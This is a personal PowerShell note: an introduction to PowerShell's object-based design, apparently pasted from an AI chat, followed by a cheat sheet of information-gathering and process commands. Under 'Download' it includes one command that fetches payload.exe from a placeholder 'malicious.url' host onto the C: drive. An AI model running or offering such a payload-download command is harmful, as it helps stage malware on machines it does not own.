---
tags:
  - it/cli
  - it/powershell
created: 2025-07-01
modified: 2025-09-14T10:49:00
---

### The Theory of PowerShell

PowerShell isn’t just a shell; it’s an **object-oriented command line**. Traditional shells like Bash spit out raw text, which you then cut, grep, and parse. PowerShell instead outputs structured **.NET objects**. That means every command (`cmdlet`) doesn’t just hand you strings — it gives you objects with properties and methods you can filter, query, or pipe along.

In short: Bash talks in text; PowerShell speaks in data.

---

### Why You Should Use It

* **Consistency:** Everything is an object. You can filter files, registry keys, processes, or even Active Directory users with the same logic.
* **Integration:** It bridges scripting, admin tasks, and development. You can hit APIs, automate Windows services, talk to Azure, or just rename 1000 files — all in one place.
* **Extensibility:** You can load modules, write your own cmdlets, and even drop into C# or .NET inline if you need raw power.
* **Cross-platform:** It’s not just “Windows-only” anymore. PowerShell Core runs on Linux and macOS too.

Think of it as a shell, scripting language, and automation framework rolled into one.

---

### The Benefits

* **Automation heaven**: If you ever click the same 5 buttons in Windows twice, you can script it away.
* **Error handling & logging**: Proper try/catch blocks and structured error objects, unlike Bash’s “return code roulette.”
* **Pipelines with brains**: Piping objects means you don’t regex every output; you just grab `.Length` or `.LastWriteTime`.
* **Uniform access**: File system, registry, processes, services, cloud resources — all look the same from PowerShell.

It’s like switching from chisels to power tools.

---

### How to Switch Daily

* **Replace old habits gradually:** Instead of `dir`, start using `Get-ChildItem` (or its alias `ls`). Instead of `cat`, try `Get-Content`.
* **Alias safety net:** PowerShell has aliases for Linux-like commands (`ls`, `cp`, `mv`), so you won’t feel lost.
* **Automate small annoyances:** Write a one-liner for cleaning temp files, bulk renaming, or fetching system info. Use it daily until it sticks.
* **Use profiles:** PowerShell lets you configure your environment (shortcuts, custom functions) so it feels like *your* shell.
* **Go cross-platform:** Try PowerShell Core on Linux/macOS to use the same habits everywhere.

Switching is less about “ditching Bash” and more about **training your hands to think in objects** instead of text streams.

---

If you want, I can sketch a **“30-day PowerShell ramp-up plan”** that shows you what habits to swap each week so you naturally shift into it. Want me to map that out?





## Information gathering

### Basics
```powershell
Get-ComputerInfo
```

```
(Get-WmiObject Win32_OperatingSystem).Version
```

List running processes
```
Get-Process
```

```
Stop-Process -Name notepad
```



### Network Information

```
Get-NetIPAddress
```

List active network connections
```
Get-NetTCPConnection
```

### Users
List local users
```
Get-LocalUser
```

List active users
```
query user
```

### Download 
```
Invoke-WebRequest -Uri http://malicious.url/payload.exe -OutFile C:\payload.exe
```



## Process management
```powershell
Get-Process | Where-Object {$_.MainWindowTitle -like "*Notepad*"} | Stop-Process -Force
```


## Windows Architecture
```powershell
$env:PROCESSOR_ARCHITECTURE
# AMD64
```
